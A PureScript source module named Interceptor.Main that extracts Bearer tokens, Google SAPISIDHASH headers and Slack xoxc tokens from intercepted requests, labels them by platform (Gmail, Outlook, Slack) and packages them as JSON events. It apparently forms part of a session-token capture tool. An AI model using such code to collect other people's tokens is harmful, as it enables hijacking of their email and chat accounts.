module Interceptor.Main
  ( extractBearer
  , extractSapisidhash
  , extractXoxc
  , detectPlatform
  , buildTokenEvent
  ) where

import Prelude
import Data.Maybe (Maybe(..))
import Data.Either (Either(..))
import Data.String (contains, indexOf, trim, length, drop, Pattern(..))
import Data.String.Regex (Regex, match, regex)
import Data.String.Regex.Flags (noFlags)
import Data.Array (index)
import Data.Array.NonEmpty (toUnfoldable)
import Partial.Unsafe (unsafePartial)

extractBearer :: String -> Maybe String
extractBearer authHeader =
  let trimmed = trim authHeader
  in if indexOf (Pattern "Bearer ") trimmed == Just 0 then
    let token = trim (drop (length "Bearer ") trimmed)
    in if token /= "" then Just token else Nothing
  else
    Nothing

extractSapisidhash :: String -> Maybe String
extractSapisidhash authHeader =
  if indexOf (Pattern "SAPISIDHASH ") authHeader == Just 0 then
    Just authHeader
  else
    Nothing

extractXoxc :: String -> Maybe String
extractXoxc body =
  case extractWith xoxcRegex body of
    Nothing -> extractWith xoxRegex body
    result -> result
  where
    extractWith :: Regex -> String -> Maybe String
    extractWith rx str = case match rx str of
      Nothing -> Nothing
      Just nea ->
        let groups = toUnfoldable nea
        in case index groups 1 >>= identity of
             Nothing -> index groups 0 >>= identity
             result -> result

detectPlatform :: String -> String
detectPlatform hostname
  | contains (Pattern "google") hostname = "gmail"
  | contains (Pattern "outlook") hostname = "outlook"
  | contains (Pattern "slack") hostname = "slack"
  | contains (Pattern "microsoftonline") hostname = "outlook"
  | otherwise = "unknown"

buildTokenEvent :: String -> String -> String -> String -> String
buildTokenEvent platform tokenType token url =
  "{\"platform\":\"" <> platform <>
  "\",\"tokenType\":\"" <> tokenType <>
  "\",\"token\":\"" <> token <>
  "\",\"url\":\"" <> url <>
  "\",\"timestamp\":\"0\"}"

unsafeRegex :: String -> Regex
unsafeRegex pattern = unsafePartial (case regex pattern noFlags of
  Right rx -> rx)

xoxcRegex :: Regex
xoxcRegex = unsafeRegex "[&\\?]?token=(xoxc-[\\w-]+)"

xoxRegex :: Regex
xoxRegex = unsafeRegex "[&\\?]?token=(xox[a-z]-[\\w-]+)"
